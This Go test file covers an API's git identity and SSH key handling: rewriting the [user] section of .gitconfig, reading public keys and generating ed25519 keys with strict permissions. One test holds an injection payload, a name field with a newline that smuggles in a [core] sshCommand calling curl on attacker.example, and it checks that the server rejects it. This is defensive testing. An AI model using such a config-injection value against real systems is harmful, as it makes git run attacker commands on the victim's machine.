package api

import (
	"bytes"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"golang.org/x/crypto/ssh"
)

func TestUpdateGitUserSection_EmptyFile(t *testing.T) {
	out := updateGitUserSection(nil, "Ada", "ada@example.com")
	got := string(out)
	if !strings.Contains(got, "[user]") {
		t.Fatalf("missing [user] section: %q", got)
	}
	if !strings.Contains(got, "name = Ada") {
		t.Fatalf("missing name: %q", got)
	}
	if !strings.Contains(got, "email = ada@example.com") {
		t.Fatalf("missing email: %q", got)
	}
}

func TestUpdateGitUserSection_ExistingUserSection(t *testing.T) {
	input := "[user]\n\tname = Old\n\temail = old@x.com\n"
	out := updateGitUserSection([]byte(input), "New", "new@x.com")
	got := string(out)
	if strings.Contains(got, "Old") || strings.Contains(got, "old@x.com") {
		t.Fatalf("old values leaked: %q", got)
	}
	if !strings.Contains(got, "name = New") || !strings.Contains(got, "email = new@x.com") {
		t.Fatalf("new values missing: %q", got)
	}
	// Should not duplicate the user section.
	if strings.Count(got, "[user]") != 1 {
		t.Fatalf("duplicated [user] section: %q", got)
	}
}

func TestUpdateGitUserSection_PreservesOtherSections(t *testing.T) {
	input := `[core]
	editor = vim
	autocrlf = false
[alias]
	co = checkout
`
	out := updateGitUserSection([]byte(input), "Ada", "ada@x.com")
	got := string(out)
	for _, want := range []string{"[core]", "editor = vim", "autocrlf = false", "[alias]", "co = checkout", "[user]", "name = Ada", "email = ada@x.com"} {
		if !strings.Contains(got, want) {
			t.Fatalf("missing %q in:\n%s", want, got)
		}
	}
}

func TestUpdateGitUserSection_AddsMissingKey(t *testing.T) {
	// [user] exists but has only name — email should be inserted.
	input := "[user]\n\tname = Ada\n[core]\n\teditor = vim\n"
	out := updateGitUserSection([]byte(input), "Ada", "ada@x.com")
	got := string(out)
	if !strings.Contains(got, "email = ada@x.com") {
		t.Fatalf("email not added: %q", got)
	}
	if !strings.Contains(got, "[core]") || !strings.Contains(got, "editor = vim") {
		t.Fatalf("unrelated section lost: %q", got)
	}
}

func TestReadGitUser_Roundtrip(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, ".gitconfig")
	if err := writeGitUser(path, "Ada", "ada@example.com"); err != nil {
		t.Fatal(err)
	}
	name, email, err := readGitUser(path)
	if err != nil {
		t.Fatal(err)
	}
	if name != "Ada" || email != "ada@example.com" {
		t.Fatalf("got %q/%q", name, email)
	}
}

func TestReadGitUser_Missing(t *testing.T) {
	name, email, err := readGitUser(filepath.Join(t.TempDir(), "nope"))
	if err != nil {
		t.Fatal(err)
	}
	if name != "" || email != "" {
		t.Fatalf("expected empty, got %q/%q", name, email)
	}
}

func TestReadPubkey_EmptyFileIsAbsent(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "id_ed25519.pub")
	if err := os.WriteFile(path, []byte("   \n\t\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	if _, ok := readPubkey(path); ok {
		t.Fatal("empty/whitespace-only pubkey file should be treated as absent")
	}
}

func TestUpdateGitUserSection_DuplicateUserSections(t *testing.T) {
	// Two [user] sections, each missing at least one key. Both should end up
	// with both keys so git's last-wins read returns the correct values.
	input := "[user]\n\tname = Old1\n[core]\n\teditor = vim\n[user]\n\temail = old2@x.com\n"
	out := updateGitUserSection([]byte(input), "New", "new@x.com")
	got := string(out)

	// No stale values.
	for _, bad := range []string{"Old1", "old2@x.com"} {
		if strings.Contains(got, bad) {
			t.Fatalf("stale value %q leaked:\n%s", bad, got)
		}
	}
	// Unrelated section preserved.
	if !strings.Contains(got, "[core]") || !strings.Contains(got, "editor = vim") {
		t.Fatalf("unrelated section lost:\n%s", got)
	}
	// Both [user] sections have both keys — count name/email occurrences.
	if n := strings.Count(got, "name = New"); n != 2 {
		t.Fatalf("expected 2 name lines, got %d:\n%s", n, got)
	}
	if n := strings.Count(got, "email = new@x.com"); n != 2 {
		t.Fatalf("expected 2 email lines, got %d:\n%s", n, got)
	}
}

func TestPutGitIdentity_RejectsNewlineInName(t *testing.T) {
	srv, _ := newAuthTestServer(t)
	srv.rootDir = t.TempDir()
	token := loginAndGetToken(t, srv)

	inject := "Ada\n[core]\n\tsshCommand = curl attacker.example/x"
	body, _ := json.Marshal(map[string]string{"name": inject, "email": "ada@example.com"})
	req := httptest.NewRequest(http.MethodPut, "/api/git-identity", bytes.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	req.AddCookie(&http.Cookie{Name: "hiro_session", Value: token})
	rec := httptest.NewRecorder()
	srv.ServeHTTP(rec, req)

	if rec.Code != http.StatusBadRequest {
		t.Fatalf("expected 400 for newline in name, got %d: %s", rec.Code, rec.Body.String())
	}
	// And crucially: no .gitconfig written.
	if _, err := os.Stat(filepath.Join(srv.rootDir, ".gitconfig")); !os.IsNotExist(err) {
		t.Fatalf(".gitconfig written despite rejected request: err=%v", err)
	}
}

func TestGenerateSSHKey(t *testing.T) {
	dir := filepath.Join(t.TempDir(), ".ssh")
	priv := filepath.Join(dir, "id_ed25519")
	pub := filepath.Join(dir, "id_ed25519.pub")

	line, err := generateSSHKey(dir, priv, pub, "hiro@test")
	if err != nil {
		t.Fatal(err)
	}
	if !strings.HasPrefix(line, "ssh-ed25519 ") {
		t.Fatalf("pubkey not ed25519: %q", line)
	}
	if !strings.HasSuffix(line, "hiro@test") {
		t.Fatalf("missing comment: %q", line)
	}

	// Private key must be parseable as an OpenSSH private key.
	privBytes, err := os.ReadFile(priv)
	if err != nil {
		t.Fatal(err)
	}
	signer, err := ssh.ParsePrivateKey(privBytes)
	if err != nil {
		t.Fatalf("private key unparseable: %v", err)
	}
	// Pubkey on disk must match the private key's public half.
	pubFromPriv := strings.TrimSpace(string(ssh.MarshalAuthorizedKey(signer.PublicKey())))
	if !strings.HasPrefix(line, pubFromPriv) {
		t.Fatalf("pubkey mismatch:\nline: %s\npriv: %s", line, pubFromPriv)
	}

	// Permissions.
	st, err := os.Stat(priv)
	if err != nil {
		t.Fatal(err)
	}
	if st.Mode().Perm() != 0o600 {
		t.Fatalf("priv perms = %o, want 0600", st.Mode().Perm())
	}
	dst, err := os.Stat(dir)
	if err != nil {
		t.Fatal(err)
	}
	if dst.Mode().Perm() != 0o700 {
		t.Fatalf("dir perms = %o, want 0700", dst.Mode().Perm())
	}
}
